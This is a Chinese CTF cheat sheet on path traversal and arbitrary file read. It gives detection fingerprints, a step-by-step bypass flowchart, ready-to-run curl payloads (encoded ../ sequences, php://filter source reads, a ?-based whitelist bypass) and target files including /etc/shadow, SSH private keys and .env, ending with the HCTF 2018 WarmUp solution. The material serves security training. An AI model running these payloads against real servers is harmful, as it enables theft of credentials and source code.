# 目录穿越与任意文件读取

关键词：目录穿越 任意文件读取 路径遍历 目录遍历 下载漏洞 文件读取 路径穿越

## ① 识别指纹

- 参数名是 `file`、`path`、`filename`、`page`、`download`、`url`、`img`、`template`
- 页面有"下载附件 / 导出报告 / 预览图片"按钮，请求里带文件名
- 错误信息回显完整路径，如 `/var/www/html/upload/xxx` 或 `C:\inetpub\wwwroot`
- 源码里出现 `readfile($_GET['file'])`、`file_get_contents`、`fopen`、`include`
- 题干出现 **任意文件读取、目录穿越、LFI、下载、备份** 这类词
- 题目名是 **Files、Download、Read、Path、Backup** 的组合
- 能读到 `/etc/passwd` 却读不到目标 → 是路径或权限问题，不是过滤问题
- 上传点与下载点同时存在 → 优先想软链接或 `phar://`

## ② 考什么

- `../` 基础穿越与层级数
- 编码变形：`%2e%2e%2f`、`..%2f`、`%252e%252e%252f`、`..%5c`
- 过滤绕过：`....//`、`..././`、双写、`..%00`
- 绝对路径（Linux `/etc/passwd`，Windows `C:\Windows\win.ini`）
- 后缀强制拼接时的截断（`%00`、路径长度）
- 白名单校验绕过（`?`、`#`、`/../`、urldecode 差异）
- `php://filter` 读源码（base64 编码，避免被 include 执行）
- 软链接、日志包含、session 包含
- `/proc` 下文件：`/proc/self/cmdline`、`/proc/self/environ`、`/proc/self/cwd/`
- 常见敏感文件与配置泄露

## ③ 判断流程

> 先确认"读点"，再谈"穿越"。读点找错，payload 再花也白费。

1. 正常请求一次，确认参数值就是文件路径（原值返回文件内容）→ 读取点在 `file`，跳第 2 条；参数不是路径或请求里找不到文件名 → 回第 1 条，去看下载按钮的原始请求
2. 把值换成 `../../../../etc/passwd` → 回显 `root:x:0:0` → 无过滤穿越，直接读 `/flag` 或 web 目录下的 flag，结束
3. 返回 404/403/空页/固定错误页 → 过滤存在，记下被拦的字符，跳第 4 条
4. 逐个发变形：`....//....//....//etc/passwd`、`..%2f..%2fetc%2fpasswd`、`%2e%2e%2f%2e%2e%2fetc%2fpasswd`、`%252e%252e%252fetc%252fpasswd`、`..%5c..%5c` → 任一变体成功，结束；全失败 → 跳第 5 条
5. 后端是 Windows（报错带盘符、`\` 路径、IIS 头）→ 换 `..\..\..\windows\win.ini`、`C:/Windows/win.ini`、`C:\Windows\win.ini`，成功即结束
6. 源码把后缀写死（`$file.'.php'`）→ 先 `%00` 截断（PHP < 5.3.4）；无效 → 用 `/../` 吃掉后缀或用路径长度截断；仍无效 → 跳第 7 条
7. 源码有白名单校验（`in_array`/`strpos`/`preg_match`）→ 用 `?`、`#`、`%00` 让校验看到合法值，同时让实际读取路径带上 `../`；构造成功直接读目标，结束；构造成立但拼接后打不开 → 打印推断拼接规则，调整 `../` 层数
8. 能读但目标是 PHP 源码（直接读会执行）→ `php://filter/convert.base64-encode/resource=index.php`，base64 解码看源码，然后回第 1 条重扫新参数
9. 目标不是文本（日志、session、二进制）→ 先直连下载原文件；需要过滤特定字符时用 `php://filter` 链（`convert.iconv`、`string.strip_tags`）；`php://filter` 也被拦 → 回第 1 条换读取点
10. 读了多个路径都为空 → 换目标：`/proc/self/cmdline` 看启动参数、`/proc/self/environ` 看环境变量、`/root/.ssh/id_rsa`、`/etc/nginx/nginx.conf`、`/var/www/html/.env`
11. 有上传点且能写文件 → 先上传任意文件确认落点，再 `ln -s /flag /var/www/html/upload/x.txt` 建软链接，从下载接口读；不能建软链接 → 跳第 12 条
12. 无回显（盲读）→ 用报错差异、响应长度、时间差判断；全不行 → 回第 1 条，把参数扩到 POST body、Cookie、JSON 字段

## ④ 工具与命令

```bash
# 基础穿越：层级不够就继续加 ../
curl "http://t.cn/download.php?file=../../../../etc/passwd"
curl "http://t.cn/download.php?file=../../../../../../flag"

# 编码变形（服务端只删一次 ../ 时用）
curl "http://t.cn/d?file=....//....//....//etc/passwd"
curl "http://t.cn/d?file=..%2f..%2f..%2fetc%2fpasswd"
curl "http://t.cn/d?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl "http://t.cn/d?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"   # 双重编码
curl "http://t.cn/d?file=..%5c..%5c..%5cwindows%5cwin.ini"               # Windows

# 绝对路径（前缀被拼接时也常常有效）
curl "http://t.cn/d?file=/etc/passwd"
curl "http://t.cn/d?file=C:/Windows/win.ini"

# 白名单用 ? 截断校验：校验只看 ? 前，实际读取用整串
curl "http://t.cn/?file=index.php?/../../../../etc/passwd"

# 读 PHP 源码，避免被 include 执行
curl "http://t.cn/d?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d

# 保存原始响应，不要只看终端里被截断的输出
curl -s -D headers.txt "http://t.cn/d?file=../../../../etc/passwd" -o body.bin
```

```bash
# 有上传/写权限时：软链接指向 flag，再从下载接口读
ln -s /flag /var/www/html/upload/link.txt
curl "http://t.cn/download.php?file=upload/link.txt"
```

```text
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/cmdline
/proc/self/environ
/proc/self/cwd/index.php
/root/.ssh/id_rsa
/var/www/html/.env
/var/www/html/config.php
C:\Windows\win.ini
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 返回 "hacker" / "no" / WAF 页 | 有黑名单，不是路径不存在 | 换 `....//`、编码变形，别硬刚原 payload |
| 浏览器地址栏里 `../` 被自动折叠 | 浏览器或代理先做了路径规范化 | 用 curl 或 Burp 发原始请求 |
| 加到三重编码还是失败 | WAF 在多次解码之间反复匹配 | 回到 `....//` 或换读取点，别无限加编码层 |
| `../` 加到 10 层还是 404 | 目标不在根目录，或容器 chroot 了 | 改绝对路径，或从报错里读真实路径再算层数 |
| `....//` 成功但 `..%2f` 失败 | 服务端只做了一次字符串替换 | 沿用成功的同一种变形，不要换 |
| 读到 `/etc/passwd` 却找不到 flag | flag 在 web 目录或环境变量里 | `ls` 当前目录、读 `/proc/self/environ`、读 `.env` |
| 回显把 `php://filter` 当普通文件名 | `allow_url_include` 关闭，或 filter 串被过滤破坏 | filter 只用于 `include`/`file_get_contents`，检查字符是否被删 |
| 下载接口 200 但内容为空 | 路径存在但无读权限，或读到的是目录 | 先拿 `/etc/passwd` 验证读点，再换目标 |
| `%00` 截断无效 | PHP >= 5.3.4 已修复 | 换路径长度截断或白名单绕过 |
| Windows 路径一直 404 | URL 里的 `\` 没转义，或盘符大小写不对 | 用 `%5c`，并试 `C:`/`c:` 两种写法 |
| 白名单绕过成功但 include 报 `failed to open stream` | 校验通过，但拼接后的真实路径不对 | 打印/推断拼接规则，再调整 `../` 层数 |

## ⑥ 例题

**题目**：`[HCTF 2018] WarmUp`
**来源**：BUUCTF 复现平台 / 攻防世界（原题出自 HCTF 2018）
**题干**：打开只有一个表情包的页面，查看源码发现提示 `source.php`。

**关键观察**：

- `?file=source.php` 能读出 `emmm::checkFile()` 的源码：白名单 `["source"=>"source.php","hint"=>"hint.php"]`，先取 `?` 之前的部分做校验，再 `urldecode` 重复一次，最后 `include $_REQUEST['file']`
- `hint.php` 明说 flag 在 `ffffllllaaaagggg`
- 校验只看 `?` 之前，实际 include 用完整字符串 → 可以用 `?` 骗过白名单，再用 `../` 穿越

**走了哪条链**：第 1 条（确认 `file` 是读取点）→ 第 7 条（源码有白名单，用 `?` 让校验看到 `source.php`，实际路径带上 `../`），一次命中。

**命令与输出**：

```text
?file=source.php
→ 回显 checkFile 源码

?file=hint.php
→ flag not here, and flag in ffffllllaaaagggg

?file=source.php?/../../../../ffffllllaaaagggg
→ flag{...}
```

**为什么能成**：`checkFile` 取 `?` 前的部分，看到的是 `source.php`，白名单通过；而 `include` 拿到的是完整字符串，PHP 解析相对路径时会把 `source.php?/..` 这一段折叠掉，最终落到根目录的 `ffffllllaaaagggg`。`../` 的层数按环境试，常见 4 到 6 层。

**结果**：页面直接回显 flag，以原题平台为准。

::: tip flag 说明
本页例题的 flag 随平台和容器实例变化，不在页内固定。练习目标是走通判断流程。
:::
